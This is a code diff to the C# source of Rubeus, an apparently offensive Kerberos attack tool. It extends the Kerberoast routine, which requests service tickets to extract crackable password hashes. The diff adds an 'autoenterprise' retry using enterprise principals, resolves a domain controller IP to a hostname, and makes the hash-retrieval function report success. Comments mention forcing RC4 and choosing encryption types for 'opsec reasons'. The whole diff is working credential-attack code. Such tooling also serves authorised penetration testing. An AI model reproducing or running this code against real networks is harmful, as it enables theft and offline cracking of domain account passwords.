@@ -249,7 +249,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false, bool enterprise = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false)
         {
             if (userStats)
             {
@@ -350,6 +350,15 @@ namespace Rubeus
                         Ticket ticket = TGT.tickets[0];
                         byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
                         Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
+
+                        // check if we've been given an IP for the DC, we'll need the name for the LDAP service ticket
+                        Match match = Regex.Match(dc, @"([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(\d{1,3}\.){3}\d{1,3}");
+                        if (match.Success)
+                        {
+                            System.Net.IPAddress dcIP = System.Net.IPAddress.Parse(dc);
+                            System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);
+                            dc = dcInfo.HostName;
+                        }
 
                         // request a service tickt for LDAP on the target DC
                         kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
@@ -608,12 +617,24 @@ namespace Rubeus
                                    )
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    if (!result && autoenterprise)
+                                    {
+                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    }
                                 }
                                 else
                                 {
                                     // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    if (!result && autoenterprise)
+                                    {
+                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);
+                                    }
                                 }
                             }
                             else
@@ -793,7 +814,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
+        public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
             string userDomain = "DOMAIN";
@@ -829,7 +850,10 @@ namespace Rubeus
                 KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
                 DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
                 Console.WriteLine();
+                return true;
             }
+
+            return false;
         }
 
         public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)
